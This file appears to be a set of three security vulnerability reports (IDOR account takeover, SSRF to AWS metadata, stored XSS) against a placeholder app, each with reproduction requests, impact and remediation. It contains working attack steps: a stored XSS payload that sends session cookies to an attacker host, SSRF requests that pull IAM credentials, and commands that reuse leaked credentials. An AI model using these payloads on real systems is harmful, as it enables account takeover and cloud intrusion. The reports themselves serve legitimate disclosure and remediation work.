@@ -1,0 +1,258 @@
+# Report: Insecure Direct Object Reference (IDOR) in Account Management API Leading to Full Account Takeover
+
+## Executive Summary
+The `/api/v2/users/{user_id}/profile` endpoint fails to validate that the authenticated session owner matches the requested `user_id` path parameter. An attacker with a valid low-privilege session can enumerate sequential or GUID-based user identifiers and retrieve, and subsequently modify, sensitive account fields belonging to arbitrary users — including the email address and password reset token — resulting in complete account takeover without any interaction from the victim.
+
+## Severity and CVSS Score
+**Severity:** Critical
+**CVSS 3.1 Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`
+**CVSS Score:** 9.6 (Critical)
+
+## Vulnerable Endpoint
+```
+GET  /api/v2/users/{user_id}/profile
+PUT  /api/v2/users/{user_id}/profile
+Host: app.example-corp.com
+```
+
+## Steps to Reproduce
+
+**Step 1 — Authenticate as low-privilege test account (user_id: 10432)**
+```http
+POST /api/v2/auth/login HTTP/1.1
+Host: app.example-corp.com
+Content-Type: application/json
+
+{
+  "email": "attacker@test.com",
+  "password": "TestPass123!"
+}
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "session_token": "eyJhbGciOiJIUzI1NiIs...redacted",
+  "user_id": 10432
+}
+```
+
+**Step 2 — Request another user's profile by incrementing `user_id`**
+```http
+GET /api/v2/users/10431/profile HTTP/1.1
+Host: app.example-corp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...redacted
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "user_id": 10431,
+  "email": "victim@corp-client.com",
+  "full_name": "J. Alvarez",
+  "phone": "+1-555-0134",
+  "reset_token": "b8f2e7c1-4a3d-4f9e-9c2a-7d1e5f6a8b90"
+}
+```
+
+**Step 3 — Abuse the exposed `reset_token` to hijack the account**
+```http
+POST /api/v2/auth/reset-password HTTP/1.1
+Host: app.example-corp.com
+Content-Type: application/json
+
+{
+  "user_id": 10431,
+  "reset_token": "b8f2e7c1-4a3d-4f9e-9c2a-7d1e5f6a8b90",
+  "new_password": "P4wned!2024"
+}
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "password_updated"
+}
+```
+The attacker now controls the victim account fully.
+
+## Business Impact
+- Mass account takeover is trivially scriptable by iterating `user_id` values, exposing the entire user base.
+- Exposure of PII (email, phone, name) constitutes a reportable data breach under GDPR/CCPA.
+- Reset tokens returned in plaintext via a GET request compound the issue into an authentication bypass, not merely a data-disclosure bug.
+- Reputational and contractual risk if enterprise clients' end-user data is exfiltrated.
+
+## Remediation Guidelines
+1. Enforce object-level authorization on every request: verify `session.user_id == path.user_id` (or an equivalent ACL/role check for admin access) server-side before returning or mutating data.
+2. Never return password reset tokens, session secrets, or other sensitive credentials in profile read responses.
+3. Replace sequential integer IDs with non-guessable UUIDs for externally referenced resources, as defense-in-depth (not a substitute for authorization checks).
+4. Add automated authorization tests (e.g., BOLA/IDOR test suites) to CI to catch missing ownership checks on new endpoints.
+5. Implement centralized policy enforcement (e.g., an authorization middleware or OPA policy) rather than ad hoc checks per route.
+
+---
+
+# Report: Server-Side Request Forgery (SSRF) in URL Preview Feature Exposing AWS Instance Metadata Service
+
+## Executive Summary
+The "Link Preview" feature, which fetches remote URLs server-side to generate a thumbnail/summary card, does not validate or restrict the destination host. By submitting a URL pointing to the AWS Instance Metadata Service (IMDSv1, `169.254.169.254`), an attacker can coerce the backend into retrieving IAM role credentials, which are then reflected back in the preview response. These credentials can be used to pivot into the victim's AWS environment.
+
+## Severity and CVSS Score
+**Severity:** Critical
+**CVSS 3.1 Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
+**CVSS Score:** 9.9 (Critical)
+
+## Vulnerable Endpoint
+```
+POST /api/v1/links/preview
+Host: app.example-corp.com
+```
+
+## Steps to Reproduce
+
+**Step 1 — Submit the internal metadata URL as the "link to preview"**
+```http
+POST /api/v1/links/preview HTTP/1.1
+Host: app.example-corp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...redacted
+Content-Type: application/json
+
+{
+  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+}
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "preview_title": "app-prod-ec2-role",
+  "preview_body": "app-prod-ec2-role"
+}
+```
+
+**Step 2 — Fetch the temporary IAM credentials for the discovered role**
+```http
+POST /api/v1/links/preview HTTP/1.1
+Host: app.example-corp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...redacted
+Content-Type: application/json
+
+{
+  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-prod-ec2-role"
+}
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "preview_title": "app-prod-ec2-role",
+  "preview_body": "{\"AccessKeyId\":\"ASIAOKPXNQZ7EXAMPLE\",\"SecretAccessKey\":\"wJalrXUt...redacted\",\"Token\":\"IQoJb3JpZ2luX2VjE...redacted\",\"Expiration\":\"2026-07-16T02:00:00Z\"}"
+}
+```
+
+**Step 3 — Use the leaked credentials externally**
+```bash
+export AWS_ACCESS_KEY_ID=ASIAOKPXNQZ7EXAMPLE
+export AWS_SECRET_ACCESS_KEY=wJalrXUt...redacted
+export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjE...redacted
+
+aws sts get-caller-identity
+aws s3 ls
+```
+Depending on the IAM role's attached policies, this can grant read/write access to internal S3 buckets, RDS snapshots, or other AWS resources.
+
+## Business Impact
+- Direct compromise of cloud infrastructure credentials from a single web-tier bug — the "crown jewels" of a cloud-native environment.
+- Potential lateral movement into production databases, internal services, and CI/CD pipelines depending on role scope.
+- Regulatory exposure if the compromised role has access to customer data stores.
+- Attackers can pivot to further internal-network SSRF targets (internal admin panels, cloud provider APIs, orchestration dashboards) using the same flaw.
+
+## Remediation Guidelines
+1. Migrate to IMDSv2 (session-oriented, token-required) and enforce `HttpPutResponseHopLimit: 1` to prevent proxied requests from reaching the metadata service.
+2. Implement strict server-side URL validation: block requests to RFC 1918 private ranges, link-local addresses (`169.254.0.0/16`), loopback, and cloud metadata IPs via an allowlist-based egress filter, not a denylist.
+3. Resolve DNS and re-validate the resolved IP immediately before the outbound request to prevent DNS-rebinding bypasses of hostname-based filters.
+4. Run the URL-fetching component in an isolated, no-egress-by-default network segment with an explicit proxy allowlist for legitimate preview targets.
+5. Scope IAM roles attached to application instances to least privilege, and enable AWS GuardDuty/CloudTrail alerting on unexpected `sts:GetCallerIdentity` or metadata-service access patterns.
+
+---
+
+# Report: Stored Cross-Site Scripting (XSS) via Unsanitized Profile Bio Field
+
+## Executive Summary
+The user profile "Bio" field accepts arbitrary HTML/JavaScript on submission and renders it without sanitization or output encoding on any page where the profile is viewed (public profile page, comment author tooltip, admin user-management dashboard). A malicious payload stored once executes in the browser context of every user — including administrators — who subsequently views the attacker's profile, enabling session hijacking and privileged action forgery.
+
+## Severity and CVSS Score
+**Severity:** High
+**CVSS 3.1 Vector:** `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`
+**CVSS Score:** 8.8 (High)
+
+## Vulnerable Endpoint
+```
+PUT /api/v1/users/me/profile
+Host: app.example-corp.com
+
+GET /profile/{username}   (rendering context)
+```
+
+## Steps to Reproduce
+
+**Step 1 — Submit a malicious payload as the bio via the profile update API**
+```http
+PUT /api/v1/users/me/profile HTTP/1.1
+Host: app.example-corp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...redacted
+Content-Type: application/json
+
+{
+  "bio": "<img src=x onerror=\"fetch('https://attacker-c2.example/collect?c='+document.cookie)\">"
+}
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "profile_updated",
+  "bio": "<img src=x onerror=\"fetch('https://attacker-c2.example/collect?c='+document.cookie)\">"
+}
+```
+
+**Step 2 — Victim (including an admin reviewing flagged accounts) views the attacker's profile page**
+```http
+GET /profile/attacker_handle HTTP/1.1
+Host: app.example-corp.com
+Cookie: session=eyJhbGciOiJIUzI1NiIs...victim_session
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<div class="bio-section">
+  <img src=x onerror="fetch('https://attacker-c2.example/collect?c='+document.cookie)">
+</div>
+```
+The `onerror` handler fires immediately on render, exfiltrating the viewing user's session cookie to the attacker-controlled endpoint.
+
+**Step 3 — Attacker server receives the exfiltrated session**
+```http
+GET /collect?c=session%3DeyJhbGciOiJIUzI1NiIs...victim_session HTTP/1.1
+Host: attacker-c2.example
+```
+This session can be replayed to impersonate the victim, including an administrator if they viewed the profile via the moderation dashboard.
+
+## Business Impact
+- Self-propagating risk: any privileged user (support staff, moderators, admins) who views the malicious profile is compromised, enabling escalation from a low-privilege account to admin-level access.
+- Persistent, stored nature means the payload affects every future viewer until removed — unlike reflected XSS, no per-victim phishing link is required.
+- Session hijacking can lead to full account takeover, data exfiltration, or unauthorized administrative actions (e.g., disabling security controls, exporting user data).
+- Erodes trust in the platform's core social/profile features, which are viewed by essentially all users.
+
+## Remediation Guidelines
+1. Sanitize the bio field on input using an allowlist-based HTML sanitizer (e.g., DOMPurify server-side equivalent, or a library like `bleach`/`ammonia`) that strips event handlers, `<script>`, and dangerous tags/attributes.
+2. Apply context-aware output encoding at render time regardless of input sanitization, as defense-in-depth (HTML-entity encode when rendering into HTML body context).
+3. Deploy a strict Content Security Policy (CSP) disallowing inline event handlers and unauthorized script sources (`script-src 'self'`), which would have prevented the inline `onerror` payload from executing.
+4. Set the `HttpOnly` and `Secure` flags on session cookies so they cannot be read via `document.cookie` even if a stored XSS bypass is later found.
+5. Add automated XSS regression testing (e.g., payload fuzzing on all user-controlled rich-text fields) to the CI/CD pipeline.
